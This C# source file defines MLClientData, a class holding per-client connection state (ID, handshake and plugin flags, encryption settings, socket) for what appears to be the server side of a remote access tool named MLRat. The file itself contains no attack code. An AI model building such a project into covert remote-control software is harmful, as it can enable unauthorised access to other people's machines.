using MLRat.Handlers;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace MLRat.Networking
{
    public class MLClientData : IDisposable
    {
        public object DisplayObject { get; set; }
        public Guid ID { get; private set; }
        public bool Handshaken { get; set; }
        public bool PluginsVerified { get; set; }
        public eSock.eSockEncryptionSettings Encryption {get { return ClientSocket.Encryption; }}
        public eSock.Server.eSockClient ClientSocket { get; private set; }
        public ClientSettings Settings { get; private set; }
        public MLClientData(Guid _id, eSock.Server.eSockClient _socket)
        {
            Settings = new ClientSettings();
            ID = _id;
            Handshaken = false;
            PluginsVerified = false;
            ClientSocket = _socket;
        }

        public void Dispose()
        {
            ClientSocket.Dispose();
        }
    }
}
